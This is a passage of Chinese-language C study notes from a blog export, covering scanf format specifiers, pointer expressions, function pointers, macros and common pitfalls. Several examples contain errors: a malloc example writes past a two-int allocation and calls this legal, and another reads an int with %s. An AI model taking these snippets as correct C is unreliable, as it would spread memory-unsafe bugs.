放在格式说明符的前面；为了读取短整数，可以将 h 放在格式说明符的前面。这些修饰符可以与 d、i、o、u 和 x 格式代码一起使用。（2）默认情况下，a、f、e 和 g 告诉 scanf() 为 float 分配数据。 如果将 L / l放在这些修饰符的前面，则 scanf() 为 double 分配数据。使用 L 就是告诉 scanf()，接收数据的变量是 long double 型变量。（3）如果使用的现代编译器程序支持 1995 年增加的宽字符特性， 则可以与 c 格式代码一起，用 l 修饰符说明类型 wchar_t 的宽字符指针；也可以与 s 格式代码一起，用 l 修饰符说明宽字符串的指针。l 修饰符也可以用于修饰扫描集，以说明宽字符。（4）控制串中的空白符使 scanf() 在输入流中跳过一个或多个空白行。空白符可以是空格(space)、制表符(tab)和新行符(newline)。 本质上，控制串中的空白符使 scanf() 在输入流中读，但不保存结果，直到发现非空白字符为止。（5）非空白符使 scanf() 在流中读一个匹配的字符并忽略之。例如，”%d,%d” 使 scanf() 先读入一个整数，读入中放弃逗号，然后读另一个整数。如未发现匹配，scanf() 返回。（6）scanf() 中用于保存读入值的变元必须都是变量指针，即相应变量的地址。（7）在输入流中，数据项必须由空格、制表符和新行符分割。逗号和分号等不是分隔符，比如以下代码：scanf(“%d%d”,&amp;r,&amp;c);将接受输入 10 20，但遇到 10,20 则失败。（8）百分号(%)与格式符之间的星号(*)表示读指定类型的数据但不保存。因此，scanf(“%d%*c%d”,&amp;x,&amp;y);对 10/20 的读入操作中，10 放入变量 x，20 放入 y。（9）格式命令可以说明最大域宽。 在百分号(%)与格式码之间的整数用于限制从对应域读入的最大字符数。例如，希望向 address 读入不多于 20 个字符时，可以书写成如下形式：scanf(“%20s”,address);如果输入流的内容多于 20 个字符，则下次 scanf() 从此次停止处开始读入。 若达到最大域宽前已遇到空白符，则对该域的读立即停止；此时，scanf() 跳到下一个域。（10）虽然空格、制表符和新行符都用做域分割符号，但读单字符操作中却按一般字符处理。例如，对输入流 “x y” 调用：scanf(“%c%c%c”,&amp;a,&amp;b,&amp;c);返回后，x 在变量 a 中，空格在变量 b 中，y 在变量 c 中。注意，控制串中的其它字符，包括空格、制表符和新行符，都用于从输入流中匹配并放弃字符，被匹配的字符都放弃。例如，给定输入流 “10t20”，调用：scanf(“%dt%d”,&amp;x,&amp;y);将把 10 和 20 分别放到 x 和 y 中，t 被放弃，因为 t 在控制串中。（11）ANSI C 标准向 scanf() 增加了一种新特性，称为扫描集(scanset)。 扫描集定义一个字符集合，可由 scanf() 读入其中允许的字符并赋给对应字符数组。 扫描集合由一对方括号中的一串字符定义，左方括号前必须缀以百分号。 例如，以下的扫描集使 scanf() 读入字符 A、B 和 C：%[ABC]使用扫描集时，scanf() 连续吃进集合中的字符并放入对应的字符数组，直到发现不在集合中的字符为止(即扫描集仅读匹配的字符)。返回时，数组中放置以 null 结尾、由读入字符组成的字符串。 用字符 ^ 可以说明补集。把 ^ 字符放为扫描集的第一字符时，构成其它字符组成的命令的补集合，指示 scanf() 只接受未说明的其它字符。对于许多实现来说，用连字符可以说明一个范围（ISO C99标准没有规定）。例如，以下扫描集使 scanf() 接受字母 A 到 Z：%[A-Z]重要的是要注意扫描集是区分大小写的。因此，希望扫描大、小写字符时，应该分别说明大、小写字母。（12） scanf() 返回等于成功赋值的域数的值，但由于星号修饰符而读入未赋值的域不计算在内。遇到文件结束则返回EOF；若出错则返回0。 一分钟了解scanf79.8万 41”scanf计算机语言函数本词条是多义词，共2个义项展开scanf()是C语言中的一个输入函数。与printf函数一样，都被声明在头文件stdio.h里，因此在使用scanf函数时要加上#include &lt;stdio.h&gt;。（在有一些实现中，printf函数与scanf函数在使用时可以不使用预编译命令#include 。）它是格式输入函数，即按用户指定的格式从键盘上把数据输入到指定的变量之中。 中文名格式输入外文名Scan Format外语缩写scanf应用学科计算机科学软件语言C/C++快速导航返回值 格式指令说明 空白字符和非空白字符 注意问题 发展函数原型int scanf(const char *restrict format,…);函数 scanf() 是从标准输入流stdio[1] (标准输入设备，一般指向键盘)中读内容的通用子程序，可以说明的格式读入多个字符，并保存在对应地址的变量中。[2]函数的第一个参数是格式字符串，它指定了输入的格式，并按照格式说明符解析输入对应位置的信息并存储于可变参数列表中对应的指针所指位置。每一个指针要求非空，并且与字符串中的格式符一一顺次对应。返回值scanf函数返回成功读入的数据项数，读入数据时遇到了“文件结束”则返回EOF。如：scanf(“%d %d”,&amp;a,&amp;b);函数返回值为int型。如果a和b都被成功读入，那么scanf的返回值就是2；如果只有a被成功读入，返回值为1；如果a读取失败，返回值为0；如果遇到错误或遇到end of file，返回值为EOF。end of file为Ctrl+z 或者Ctrl+d。例：使用scanf函数输入数据。 include &lt;stdio.h&gt;int main(void){ int a,b,c; printf(“Give me the value of a,b,c seperated with whitespaces:\\n”); scanf(“%d%d%d”,&amp;a,&amp;b,&amp;c); printf(“a=%d,b=%d,c=%d\\n”,a,b,c); return 0;}&amp;a,&amp;b,&amp;c中的&amp;是寻址操作符，&amp;a表示对象a在内存中的地址[3] ，是一个右值。变量a，b，c的地址是在编译阶段分配的（存储顺序由编译器决定）。这里注意：如果scanf中%d是连着写的如“%d%d%d”,在输入数据时，数据之间不可以用逗号分隔，只能用空白字符（空格或tab键或者回车键）分隔——“2 （空格）3（tab） 4” 或 “2（tab）3（回车）4”等。若是“%d,%d,%d”，则在输入数据时需要加“,”，如“2,3,4”。格式指令说明format指向的字符串包含的格式指令由以下字符序列组成[4] ：*表示读入的数据将被舍弃。带有的格式指令不对应可变参数列表中的任何数据。域宽以一个非零的十进制整数形式出现。表示该格式指令最多读入的字符数。格式说明符c 读入域宽指定的数目个字符组成的字符序列（后面不会加上空字节），如果省略宽度则读入单字符。如%c或%1c读入单字符，%2c读入两个字符（后面不会加上空字节），以此类推。s读入一个的字符序列，后面会加上空字节，遇到空白字符(\\t \\r \\n 空格等)完成读取。d 读入可选有符号（可选有符号表示输入时可以带符号也可以不带符号，不带符号则视为非负）十进制整数。输入格式应该像strtol函数的base实参为10调用时识别的字符序列一样。u 读入无符号符号十进制整数。输入格式应该像strtol函数的base实参为10调用时识别的字符序列一样。i 读入可选有符号整数。输入格式应该像strtol函数的base实参为0调用时识别的字符序列一样。a,e,f,g,A,E,F,G 读入可选有符号浮点数，输入格式应该像strtod函数识别的字符序列一样。o 读入可选有符号八进制整数。输入格式应该像strtoul函数的base实参为8调用时识别的字符序列一样。x,X读入可选有符号十六进制整数。输入格式应该像strtoul函数的base实参为16调用时识别的字符序列一样。p 读入一个指针值。读入的字符序列应该与fprintf的%p产生的字符序列形式相同。n 不读入任何字符，而是把到该位置已读入的字符数存储到与之对应的int指向的位置。本转换说明符如果带有*或者带有域宽信息（如：%n或%3n等），则后果是未定义的。扫描字符集合% 读入% 符号(百分号)无效的转换说明符将引起未定义的行为。[5]长度修饰符hh与d, i, o, u, x, X, or n配合使用，表示对应一个signed char或unsigned char数据。h与d, i, o, u, x, X, or n配合使用，表示对应一个short int或unsigned short int数据。l 与d, i, o, u, x, X, or n配合使用，表示对应一个long int或unsigned long int数据；与a, A, e, E, f, F, g, or G配合使用表示对应一个double数据；与c,s,[配合使用表示对应wchar_t数据。ll与d, i, o, u, x, X, or n配合使用，表示对应一个long long int或unsigned long long int数据。j与d, i, o, u, x, X, or n配合使用，表示对应一个intmax_t或uintmax_t数据。z与d, i, o, u, x, X, or n配合使用，表示对应一个size_t数据（或与size_t对应的有符号整型数据）。t与d, i, o, u, x, X, or n配合使用，表示对应一个ptrdiff_t数据（或与ptrdiff_t对应的无符号整型数据）。L 与a, A, e, E, f, F, g, or G配合使用，表示对应一个long double数据。如果长度修饰符与格式说明符不匹配则引起未定义的行为。[6]空白字符和非空白字符空白字符空白字符会使scanf函数在读操作中略去输入中的一个或多个空白字符。非空白字符一个非空白字符会使scanf()函数在读入时剔除掉与这个非空白字符相同的字符。说明：（1）%s 表示读字符串，而 %d 表示读整数。格式串的处理顺序为从左到右，格式说明符逐一与变元表中的变元匹配。为了读取长整数，可以将 L / l 放在格式说明符的前面；为了读取短整数，可以将 h 放在格式说明符的前面。这些修饰符可以与 d、i、o、u 和 x 格式代码一起使用。（2）默认情况下，a、f、e 和 g 告诉 scanf() 为 float 分配数据。 如果将 L / l放在这些修饰符的前面，则 scanf() 为 double 分配数据。使用 L 就是告诉 scanf()，接收数据的变量是 long double 型变量。（3）如果使用的现代编译器程序支持 1995 年增加的宽字符特性， 则可以与 c 格式代码一起，用 l 修饰符说明类型 wchar_t 的宽字符指针；也可以与 s 格式代码一起，用 l 修饰符说明宽字符串的指针。l 修饰符也可以用于修饰扫描集，以说明宽字符。（4）控制串中的空白符使 scanf() 在输入流中跳过一个或多个空白行。空白符可以是空格(space)、制表符(tab)和新行符(newline)。 本质上，控制串中的空白符使 scanf() 在输入流中读，但不保存结果，直到发现非空白字符为止。（5）非空白符使 scanf() 在流中读一个匹配的字符并忽略之。例如，”%d,%d” 使 scanf() 先读入一个整数，读入中放弃逗号，然后读另一个整数。如未发现匹配，scanf() 返回。（6）scanf() 中用于保存读入值的变元必须都是变量指针，即相应变量的地址。（7）在输入流中，数据项必须由空格、制表符和新行符分割。逗号和分号等不是分隔符，比如以下代码：scanf(“%d%d”,&amp;r,&amp;c);将接受输入 10 20，但遇到 10,20 则失败。（8）百分号(%)与格式符之间的星号()表示读指定类型的数据但不保存。因此，scanf(“%d%*c%d”,&amp;x,&amp;y);对 10/20 的读入操作中，10 放入变量 x，20 放入 y。（9）格式命令可以说明最大域宽。 在百分号(%)与格式码之间的整数用于限制从对应域读入的最大字符数。例如，希望向 address 读入不多于 20 个字符时，可以书写成如下形式：scanf(“%20s”,address);如果输入流的内容多于 20 个字符，则下次 scanf() 从此次停止处开始读入。 若达到最大域宽前已遇到空白符，则对该域的读立即停止；此时，scanf() 跳到下一个域。（10）虽然空格、制表符和新行符都用做域分割符号，但读单字符操作中却按一般字符处理。例如，对输入流 “x y” 调用：scanf(“%c%c%c”,&amp;a,&amp;b,&amp;c);返回后，x 在变量 a 中，空格在变量 b 中，y 在变量 c 中。注意，控制串中的其它字符，包括空格、制表符和新行符，都用于从输入流中匹配并放弃字符，被匹配的字符都放弃。例如，给定输入流 “10t20”，调用：scanf(“%dt%d”,&amp;x,&amp;y);将把 10 和 20 分别放到 x 和 y 中，t 被放弃，因为 t 在控制串中。（11）ANSI C 标准向 scanf() 增加了一种新特性，称为扫描集(scanset)。 扫描集定义一个字符集合，可由 scanf() 读入其中允许的字符并赋给对应字符数组。 扫描集合由一对方括号中的一串字符定义，左方括号前必须缀以百分号。 例如，以下的扫描集使 scanf() 读入字符 A、B 和 C：%[ABC]使用扫描集时，scanf() 连续吃进集合中的字符并放入对应的字符数组，直到发现不在集合中的字符为止(即扫描集仅读匹配的字符)。返回时，数组中放置以 null 结尾、由读入字符组成的字符串。用字符 ^ 可以说明补集。把 ^ 字符放为扫描集的第一字符时，构成其它字符组成的命令的补集合，指示 scanf() 只接受未说明的其它字符。对于许多实现来说，用连字符可以说明一个范围（ISO C99标准没有规定）。例如，以下扫描集使 scanf() 接受字母 A 到 Z：%[A-Z]重要的是要注意扫描集是区分大小写的。因此，希望扫描大、小写字符时，应该分别说明大、小写字母。（12） scanf() 返回等于成功赋值的域数的值，但由于星号修饰符而读入未赋值的域不计算在内。遇到文件结束则返回EOF；若出错则返回0。注意问题（1）在高版本的 Visual Studio 编译器中，scanf 被认为是不安全的，被弃用，应当使用scanf_s代替 scanf。（2） 对于字符串数组或字符串指针变量，由于数组名可以转换为数组和指针变量名本身就是地址，因此使用scanf()函数时，不需要在它们前面加上”&amp;”操作符。（3） 可以在格式化字符串中的”%”各格式化规定符之间加入一个整数，表示任何读操作中的最大位数。（4） scanf函数中没有类似printf的精度控制。如： scanf(“%5.2f”,&amp;a); 是非法的。不能企图用此语句输入小数为2位的实数。（5） scanf中要求给出变量地址，如给出变量名则会出错如 scanf(“%d”,a);是非法的，应改为scanf(“%d”,&amp;a);才是合法的。（6） 在输入多个数值数据时，若格式控制串中没有非格式字符作输入数据之间的间隔,则可用空格，TAB或回车作间隔。C编译在碰到空格，TAB，回车或非法数据(如对“%d”输入“12A”时，A即为非法数据)时即认为该数据结束。（7） 在输入字符数据(%c)时，若格式控制串中无非格式字符，则认为所有输入的字符均为有效字符。例如：scanf(“%c%c%c”,&amp;a,&amp;b,&amp;c);输入为：d e f则把’d’赋予a, ‘ ‘（空格）赋予b,’e’赋予c。因为%c 只要求读入一个字符，后面不需要用空格作为两个字符的间隔，因此把’ ‘作为下一个字符送给b。只有当输入为：def（字符间无空格） 时，才能把’d’赋于a,’e’赋予b,’f’赋予c。 如果在格式控制中加入空格作为间隔，如scanf(“%c %c %c”,&amp;a,&amp;b,&amp;c);则输入时各数据之间可加空格。我们用一些例子来说明一些规则: include&lt;stdio.h&gt;int main(void){char a,b;printf(“input character a,b\\n”);scanf(“%c%c”,&amp;a,&amp;b);/注意两个%c之间没有任何符号/printf(“%c%c\\n”,a,b);return 0;}由于scanf函数”%c%c”中没有空格，输入M N，结果输出只有M。而输入改为MN时则可输出MN两字符，见下面的输入运行情况： input character a,b输入：MN屏幕显示：MN include &lt;stdio.h&gt;int main(void) { char a,b; printf(“input character a,b\\n”); scanf(“%c %c”,&amp;a,&amp;b);/注意两个%c之间的空格/ printf(“\\n%c%c\\n”,a,b); return 0; }本例表示scanf格式控制串”%c %c”之间有空格时， 输入的数据之间可以有空格间隔。 printfprintf 的格式控制字符串 format 中的转换说明组成如下，其中 [] 中的部分是可选的：[5]%[flags][width][.precision][length]specifier，即：%[标志][最小宽度][.精度][类型长度]说明符[5] 。转换说明详解见下文。","link":"/2021/10/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9Ascanf%E4%B8%8Eprintf/"},{"title":"C语言学习笔记：指针","text":"对于初学者而言，这是一个很麻烦的东西；对于大佬而言，这是无所不能的屠龙宝刀。作为C语言中最重要的概念之一，掌握它，是通往C语言高阶应用的一条必经之路。 简介指针（pointer）是一个用来存储内存地址的变量/数据对象。缩句：指针是变量。即指针具备变量的通性。指针还有两个地址运算符：（解引用运算符）和&amp;（引用运算符）。pointer给出指针pointer指向地址的值，&amp;argument给出变量argument所在的地址。 指针可以这样赋值：ptr = &amp;var;即把var的地址赋给ptr。此时，ptr指向var。地址只能被存储在指针类型的变量中。 观察下面的程序： 12345678ptr = &amp;var_a;result = *ptr;``` 这两句等价于`result = var_a;`。既然等价，为啥不直接用后者？因为同样是赋值，前者使用指针，从而可用来函数间通信时直接修改原数据而无需返回值再赋值。 这里注意，不要解引用未初始化的指针。像这样： int * pt;*pt = 5; 123456789101112131415161718192021222324252627282930 这样做的后果可能什么事都没有，也可能擦写数据或代码，甚至是程序崩溃。因为`pt`没有被地址初始化，所以它指向的是未知地址，而对未知地址赋值的后果是未知的。## 声明指针 语法：`[数据类型] * [变量1], * [变量2], ... , * [变量n];` 不能像其他变量一样`pointer [变量名];`是因为指针声明时必须知道指针指向变量的类型和大小。 指针的转换说明是%p。转换说明就是`printf(&quot;%p&quot;,ptr1);`这样被使用的表示特定类型数据的占位符。const关键字可以被用来声明指针。它和普通指针唯一区别是：前者不能被用来更改其指向地址的值。## 指针与数组数组名是数组首元素的地址，即：`arr = &amp;arr[0];`。先说一元数组：使用指针也可以遍历数组元素。对于上面提到的`arr`，就可以用`arr+=1;`的方式访问后面的元素。也就是说，这里的+1实际上是增加一个（相应数据类型的）存储单元。同时，指针可以用来分配数组空间：看下面这个例子。```c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void){ int *a; a=(int*)malloc(sizeof(int)*2); scanf(&quot;%d %d&quot;,&amp;a[1],&amp;a[2]); return 0;} 请问这个例子合法吗？合法。因为数组名对应的值就是数组首元素的地址。这里a中存储的就是第一个数的地址，所以其用法和数组的用法是一致的。 指针的指针123int a=12;int *b=&amp;a;int **c=&amp;b; 那么这里的c是什么？ 指向指针的指针。 其中，*c表示c所指向的位置，也就是b。也就是说，**c==*b,*b==a;。 指针表达式12char ch='a';char *cp = &amp;ch; 现在，我们有了两个变量。接下来，我们会以它为基础，讨论一些指针表达式。 先来个简单的： 1ch 它可以当右值使用，此时表示ch中的值。但是当它作为左值使用时，它表示的是ch的地址。 1&amp;ch 它表示ch的地址，这个值和cp的值一样。它可以作为右值使用，但不能作为左值。因为它是一个数值，并没有指明一个计算机的内存地址。 1cp 它的右值就是cp的值，左值就是cp所处的内存位置。 1&amp;cp 和第二个一样，可以作为右值，而不能作为左值。 1*cp 作为右值时指ch处存储的值，作为左值时表示ch的内存位置。 1*cp+1 等价于(*cp)+1。即把cp的值再加一。既然是值，那么就只能作为右值使用。 1*(cp+1) 作为右值时，表示在cp+[一个该存储单元长度]处存储的值；作为左值使用时，表示cp的下一个存储单元的地址。 1++cp 表示cp的下一个位置的内存地址的值。因此不能作为左值使用，只能作为右值使用。但是注意，++操作符的前缀形式表示将cp增值后再拷贝一份，并作为返回值。 1cp++ 表示cp的下一个位置的内存地址的值。同样不能作为左值使用。但是注意，++的后缀形式表示先拷贝一份cp并作为返回值，然后再将cp增值。 1*++cp 作为右值时，它表示cp的下一个内存地址的值；作为左值时，它表示cp的下一个内存地址。这里注意下，++的前缀形式和*都是右结合的。这里因为++离得近所以先自增再间接访问。 1*cp++ 作为右值时，它表示cp的内存地址的值；作为左值时，它表示cp的内存地址。注意，此处++的优先级是高于*的。但是因为前面说过的： 但是注意，++的后缀形式表示先拷贝一份cp并作为返回值，然后再将cp增值。 所以，cp的值实际上已经自增了。之所以还表示ch处的地址/地址的值，是因为**++返回原值的拷贝再将cp自增**。 1++*cp 看了上面的例子，你应该很清楚了：它表示将ch处的值自增，并返回该值的拷贝。 1(*cp)++ 表示将cp处的值拷贝一份再返回，再自增cp处的值。所以只能作为右值使用。 1++*++cp 表示将cp的值（也就是ch的地址）自增并返回一份拷贝（即ch的下一个内存地址的指针），再对这份拷贝进行间接访问操作，再对此处（ch的下一个内存地址处）存储的值自增并返回一份拷贝。同样，因为是值，所以只能作为右值。 1++*cp++ 此处注意，++后缀形式的优先级较高，因此先返回cp的值再将cp自增，*得到++返回的cp的值（即ch），并对其进行间接访问，再由前缀的++将ch处的值自增，并返回一份拷贝。 弄清了这些，对于指针的操作应该就熟悉了。 指针和数组首先声明一个数组。 1int array[32]; array表示指向首元素的指针。所以这两种形式等价： 1printf(&quot;%d&quot;,array[15]==*(array+(15))); //输出1 多元数组同样，只需要反复嵌套即可。 这里注意，对于数组的下标，由于C实现下标的方法，实际上有两种合法形式：array[1]和1[array]都是合法的。但是很显然，后一种的可读性极差，违反直觉。所以不应被使用。 同样，函数声明也有一种旧式的K&amp;R风格：int func(a,b,c)int a;char b;float c;。它的使用也应避免：参数传递之前，char和short类型会被提升成int类型，float会被提升为double类型。这称作缺省参数提升。所以应尽量避免使用这种风格的声明。 指向数组的指针先看这个语句： 1int matrix[3][10], *mp=matrix; 这是错误的。因为matrix是指向整型数组的指针。要声明这样的指针，需要加上下标： 1int (*p)[10] = matrix; 它指向matrix的第一个整型数组。 此处注意优先级：下标引用高于间接访问。但是因为加了括号，所以实际还是间接访问先执行。 如果需要一个指针逐个访问整型元素，则可以这样： 12int *pi = &amp;matrix[0][0];int *pi = matrix[0]; //等价形式 此时，pi++会使它指向下一个整型元素。 指针数组看这个声明： 1int* api[10]; 它表示一个数组，它的每个元素都是指针：指向整型的指针。这个可以根据前面的优先级顺序推导出来。 指针和字符串常量一个字符串常量的值是什么？是一个指针常量，一个指向它第一个字符的指针常量。为什么是常量呢？因为它的（偏移）地址是编译时编译器指定的。下面来看几个似乎有点离谱的……表达式？ 1&quot;xyz&quot;+1 看起来似乎没有意义？但结合前面所说，我们可以推知，这是一个指向它本身第二个字符的指针。 1*&quot;xyz&quot; 对这个指向第一个字符x的指针，执行间接访问，结果是什么？就是它指向的字符'x'。 1&quot;xyz&quot;[2] 这表示字符'z'。但是这技巧有什么用呢？看看这个： 123456void print_process_bar(int n){ n+=5; n/=10; printf(&quot;%s\\n&quot;,&quot;**********&quot;+10-n);} 这个函数接收一个0-100间的值，输出相应数量除以10的*。像不像一个进度条呢？ 如果我们用for循环来实现，那么100%就需要循环100次。效率远不如这个函数。当然，还是可读性和可维护性更重要一些。 还有这个进制转换的方法： 1putchar(&quot;0123456789ABCDEF&quot;[value%16]); 它比传统的进制转换或许会更快一些，但是你应该写清楚注释，确保它的可读性。 指针和函数：函数指针首先，在介绍更高级的指针类型之前，很有必要看看它们是如何声明的。 12345678910111213141516171819202122232425int f; //一个整型变量int *f; //一个指向整型的指针int f(); //一个函数fint *f(); //一个返回值为指向整型的指针的函数/*上面那个语句中，()，也就是函数调用操作符，优先级高于间接访问操作符。所以f是一个函数，它的返回值是一个指向整型的指针。*/int (*f)(); //一个指向函数的指针/*需要分清的是括号的含义。第一对括号就是普通的括号，最先执行计算，表示f是一个指针。然后是第二个括号，表示函数调用，所以*f是一个返回值为int的函数，f则是指向这个函数的指针。*/int *(*f)(); //一个指向返回值为整型指针的函数指针int f[]; //一个数组int *f[]; //一个元素为整型指针的数组int (*f[])(); //一个成员为返回值为整型的函数指针的指针数组int *(*f[])(); //一个指针数组，指针所指向的类型是返回值为整型指针的函数int *(*f[])(int, float); //标准ANSI C风格的函数指针数组的声明 有一个叫做cdecl的程序，可以解释一个现存的C语言声明，不妨百度一下。 函数指针作为一种技巧，它会降低代码的可读性，但是也会提升效率。最常用的两个用法就是转换表和作为参数传给另一个函数，即：回调函数。 回调函数下面看一个程序。 12345678910111213141516#include &lt;stdio.h&gt;#include &quot;node.h&quot;Node * search_list(Node *node, void const *value, int (*compare)(void const *, void const *)){ while(node!=NULL) { if(compare(&amp;node-&gt;value, value)==0) break; node=node-&gt;link; } return node;} 这是一个类型无关的链表查找函数。它的第三个参数是一个指向比较函数的指针，所以在调用的时候，我们需要编写一个对应链表数据类型的比较函数： 1234int cmp_int(void const *a, void const *b){ return !(*(int*)a==*(int*)b);} 注意这个函数。为了使上面的查找函数类型无关，所以它调用的函数的参数也必须是类型无关的。 也是因此，在编写比较函数时，我们需要对指针进行强制类型转换，然后再解引用，才能得到正确的值。 顺便注意一下我写的比较函数，用了一些方法简写了。 转移表考虑一个计算器程序。对于一个功能很多的计算器，我们要对它的运算符编一个很长的switch语句。很繁琐，对吧？ 假设操作符是从0开始的，则可以用转移表来替换掉这个大大的switch： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;int add(int a, int b);int sub(int a, int b);int mul(int a, int b);int div(int a, int b);int (*oper_func[])(int, int) = { add, sub, mul, div};int main(void){ int a,b,oper; int result; scanf(&quot;%d %s %d&quot;,&amp;a,&amp;oper,&amp;b); result = oper_func[oper](a, b); printf(&quot;%d&quot;, result); return 0;}int add(int a, int b){ return a+b;}int sub(int a, int b){ return a-b;}int mul(int a, int b){ return a*b;}int div(int a, int b){ return a/b;} 借用函数指针数组，我们就可以根据输入的运算符编号来调用函数指针数组中对应序号的函数。 一定要注意，函数原型必须声明在函数指针数组之前。 同样的，在这里也存在下标越界的问题。但是这里的越界更难诊断出来，程序可能会直接终止，但报错的位置可能是下标越界，也可能是很奇怪的位置，因为指针可能飞到一个数据段中去了，数据被当做指令执行，肯定会出错。 更离谱点，如果这个指针刚好飞到一个函数体中，那个函数可能会快乐地执行，并且修改谁也不知道的值。这时候要找出bug就难如登天了。 实例这啥 我一个哥们问我的 1int *(*a[5])(int, char*); 比较麻烦。。不过还能看出来，区分好结构就行了。 这是一个函数指针数组的指针，指针指向的每个函数返回一个int类型的指针。 首先看大体结构。int* xxx(int,char)应是一个函数的样子。然后再细看： *a[5]又是啥？我们先看下a[5]。这是一个被初始化的，含有5个元素的数组。*表示该数组每个元素都是指针。所以，这是一个函数指针数组。 字符串长度统计1234567891011#include &lt;stdlib.h&gt;size_t strlen(char *string){ int length=0; while(*string++!='\\0') length++; return length;}","link":"/2021/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%8C%87%E9%92%88/"},{"title":"C语言学习笔记：预处理器","text":"预定义符号预处理器定义了一些符号，它们的值是一些常量。 |:—:|:—:||符号|含义||_FILE_|进行编译的源文件名||_LINE_|文件当前行的行号||_DATE_|文件被编译的日期（年月日）||_TIME_|文件被编译的时间（时分秒）||_STDC_|如果编译器支持ANSI C，它就是1，否则未定义| define首先，这是它的正式定义： 1#define name stuff 这样，每当有name出现在这一行的后面时，预处理器就会把它替换成stuff。 宏#define提供了一个机制：可以将参数替换到文本中去。这种实现被称作宏。下面是它的声明方式： 1#define name(parameter-list) stuff parameter-list，也就是参数列表，是一个由逗号分隔，每一项都可能出现在stuff中的列表。此处的括号必须与name紧邻。下面是一个实例： 1#define SQUARE(x) x * x 如果把SQUARE(5)放在随后的代码中，预处理器就会把它替换成5 * 5。但是，如果是SQUARE(5+1)呢？很显然是5+1 * 5+1，不是我们预期的结果。要修复这个问题，就把宏改成这样： 1#define SQUARE(x) (x)*(x) 那如果宏定义中间的符号是加号而非乘号呢？结果也非预期。我们又要改一改了： 1#define ADD(x) ((x)+(x)) 这样就安全了吗？并不。如果x是某种值会改变的表达式（例如x=getchar()，或者设想你写了一个用来比较大小的宏MAX(a,b)，然后如此调用：MAX(b++,c++)），那么替换后，两个x的值也不会相等。也就是说，作为宏参数的表达式会被多次求值。 那么为什么要使用宏呢？有三点原因：宏可以做到函数做不到的事；并且，宏的执行效率要高于函数。 宏比函数的效率高：因为调用函数时，需要为函数分配栈空间等，所以多少会有时间损耗。在某些场景下更是明显。宏唯一的开销是编译时的时间变长，程序体积变大。 宏能做到更多：例如这个： 12#define MALLOC(n, type) \\ ((type*)malloc((n)*sizeof(type))) 类型是无法作为函数参数进行传递的。 宏与类型无关：例如这个宏： 1#define MAX(a,b) ((a)&gt;(b)?(a):(b)) 它与类型无关。如果用函数来实现，那么就需要很多不同版本的函数了。 这里注意，宏名一般用大写字母表示。这是约定，为了区分它和函数而设定。因为它和真正的函数还是有着不同之处的。 注意 这里有两点注意事项：一个是，可以用反斜杠\\来让宏换行书写而不间断；另一个是，注意宏定义末尾并没有加分号，这是因为我们希望在书写时，可以像调用函数一样调用它，而不会因为没注意到重复分号，而在一些场合（如if-else）中将两条语句错当成一条，从而造成错误。 undef用于移除一个现存的宏定义： 1#undef name 命令行定义编译时，可以在编译选项中定义宏。 123456#include &lt;stdio.h&gt;int main(void){ int array[ARRAY_SIZE]; ... 源码中并没有给出ARRAY_SIZE的定义，所以我们必须在编译时指定。 通用格式为： 12-Dname-Dname=stuff 所以我们应该这样给出它的定义： 1gcc main.c -DARRAY_SIZE=100 条件编译12345678#if constant-expression statements/* #elif可选 */#elif constant-expression statements#else statements#endif constant-expression，即常量表达式，意思是说要么它是一个字面值常量（比如1），要么就是用define定义的符号。 此时，预处理器就会根据这几个常量表达式来对源代码选择性地编译了。在进行debug时尤为有用。定义宏DEBUG，若值为1则编译一些测试时才会用的语句；否则只编译其他语句。 同时它还有个较常用的指令：是否被定义 1234567//这几条都是等价的#if defined(symbol)#ifdef symbol//还可以用逻辑运算#if !defined(symbol)//和下面这条等价#ifndef symbol 上面所说的那些条件编译指令也支持嵌套。 include#include表示将后面跟随的文件的所有内容复制并替换这一行语句。它有两种形式： 123//这表示函数库文件#include &lt;stdio.h&gt;//这表示同目录文件。如果找不到，则会在函数库目录查找 其他包含#error，#line，#progma等。不一一介绍了。 宏的内容基本就是这些了。","link":"/2021/11/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8/"},{"title":"C语言学习笔记：杂记","text":"奇怪的赋值先上两个赋值语句。 123456int a = 5;//版本1float c_1 = (a-9)*5/9;//版本2float c_2 = (a-9)*5/9.0f; 那么请问，c_1是否和c_2的值相等呢？ 不相等。 因为这里发生了隐式类型转换。对于第一个语句，5/9的值实际上是整数，这是因为9和5都是整数。第二个语句则会得到符合我们直觉的结果。 虽然现如今很多编译器已经支持这种自动转换，但是为了确保兼容性，我们还是严格按照数据类型编写赋值语句吧。 这里再说一句，编译器遇到这样的表达式时，会进行自动类型转换，将所有操作数的类型转换为其中容纳范围最大的数据类型。顺序是short-&gt;int-&gt;unsigned int-&gt;long-&gt;unsigned long-&gt;float-&gt;double-&gt;long double 无限读取先来看看这个语句。 123456int ch;while((ch = getchar()) != '\\n'){ //statements} 在一些情况下，它的确可以正常运行。但是，在一些特殊情况下，它会无限输出。因为它的结束条件是读入的字符不是换行符。换句话来说，就是此处while的边界条件太少了，以至于循环很可能无限执行下去，导致输出超限。 之前我也不是很清楚，所以说得很抽象。实际上，这里需要使用while((ch=getchar())!=EOF)，这才是正确的终止条件。 除此之外，ch务必声明为int类型。因为char类型实际上就是短整型，所以读取的字符如果ASCII码过大（超过256）就会发生溢出，从而有可能和EOF的值相等，从而异常退出。 指针？请看下面的赋值语句，想想a,b的数据类型。 1int* a,b; 答案是：a是指向int的指针，而b是int类型的变量。原因是什么？因为*是和a在一起的。所以通常我们不会这么写，我们一般会把*放在靠近变量的一侧来避免混淆。 再来看看这个。 1234#define INTPTR int*......INTPTR 